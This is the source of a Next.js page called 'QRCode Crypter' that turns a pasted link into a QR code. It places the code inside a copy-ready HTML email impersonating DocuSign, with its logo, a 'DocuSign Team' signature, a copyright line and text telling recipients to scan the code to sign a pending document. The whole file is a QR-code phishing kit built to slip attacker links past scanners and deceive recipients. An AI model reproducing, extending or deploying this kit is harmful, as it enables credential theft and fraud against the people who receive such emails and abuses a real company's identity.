// pages/index.tsx
import { useState } from 'react'
import QRCode from 'qrcode'
import fs from 'fs/promises'
import path from 'path'
import Head from 'next/head'

type Props = {
  logoDataUri: string
  iconDataUri: string
}

export async function getStaticProps() {
  const readBase64 = async (fn: string) => {
    const buf = await fs.readFile(path.join(process.cwd(), 'public', fn))
    return `data:image/png;base64,${buf.toString('base64')}`
  }
  return {
    props: {
      logoDataUri: await readBase64('docusign_logo.png'),
      iconDataUri: await readBase64('doc_icon.png'),
    },
  }
}

export default function Home({ logoDataUri, iconDataUri }: Props) {
  const [url, setUrl] = useState('')
  const [html, setHtml] = useState('')

  const buildEmailHtml = (qrDataUri: string) => `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Document Ready to Sign</title>
</head>
<body style="margin:0;padding:0;background-color:#f4f4f4;">
  <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
    <tr>
      <td align="center" style="padding:20px 0;background:#fff;">
        <img src="${logoDataUri}" alt="DocuSign" width="120" style="display:block;margin-bottom:10px;">
        <img src="${iconDataUri}" alt="" width="48" style="display:block;">
      </td>
    </tr>
    <tr>
      <td align="center" style="padding:30px;background:#005eb8;color:#fff;font-family:Arial,sans-serif;">
        <h1 style="margin:0;font-size:24px;">Your document has been completed to review and sign.</h1>
      </td>
    </tr>
    <tr>
      <td align="center" style="padding:30px;background:#fff;">
        <img src="${qrDataUri}" alt="Scan to review document" width="200" style="display:block;border:1px solid #ddd;">
        <p style="font-family:Arial,sans-serif;font-size:14px;color:#333;margin:15px 0;">
          Scan the QR Code to view or sign the shared document.
        </p>
      </td>
    </tr>
    <tr>
      <td style="background:#fff;padding:20px;font-family:Arial,sans-serif;font-size:14px;color:#333;">
        <p>All parties have been completed.</p>
        <p>
          To review and electronically sign the pending document, please scan the QR code above.
          When DocuSign is applied, there is no requirement for a paper copy to be produced.
        </p>
        <p>Thank you,</p>
        <p><strong>The DocuSign Team</strong></p>
      </td>
    </tr>
    <tr>
      <td align="center" style="padding:20px;font-family:Arial,sans-serif;font-size:12px;color:#777;">
        &copy; ${new Date().getFullYear()} DocuSign, Inc. All rights reserved.
      </td>
    </tr>
  </table>
</body>
</html>`

  const handleGenerate = async () => {
    if (!url) return alert('Please paste a URL first.')
    try {
      const qrDataUri = await QRCode.toDataURL(url, {
        width: 200,
        margin: 2,
        color: { dark: '#000', light: '#fff' },
      })
      setHtml(buildEmailHtml(qrDataUri))
    } catch (e) {
      console.error(e)
      alert('Failed to generate QR code.')
    }
  }

  return (
    <>
      <Head>
        <title>QRCode Crypter</title>
      </Head>
      <main style={{ maxWidth: 800, margin: '2rem auto', fontFamily: 'sans-serif' }}>
        <h1>✅ QRCode Crypter</h1>
        <p>Paste your DocuSign link below and click “Generate.”</p>
        <input
          type="text"
          placeholder="https://..."
          value={url}
          onChange={(e) => setUrl(e.target.value)}
          style={{
            width: '100%',
            padding: '0.5rem',
            fontSize: '1rem',
            marginBottom: '1rem',
          }}
        />
        <button
          onClick={handleGenerate}
          style={{
            padding: '0.6rem 1.2rem',
            fontSize: '1rem',
            backgroundColor: '#005eb8',
            color: 'white',
            border: 'none',
            borderRadius: 4,
          }}
        >
          Generate
        </button>

        {html && (
          <>
            <h2 style={{ marginTop: '2rem' }}>📋 Copy HTML:</h2>
            <textarea
              readOnly
              value={html}
              rows={20}
              style={{ width: '100%', fontFamily: 'monospace', fontSize: '0.85rem' }}
            />

            <h2 style={{ marginTop: '2rem' }}>👀 Live Preview:</h2>
            <div
              style={{ border: '1px solid #ddd', margin: '1rem 0' }}
              dangerouslySetInnerHTML={{ __html: html }}
            />
          </>
        )}
      </main>
    </>
  )
}
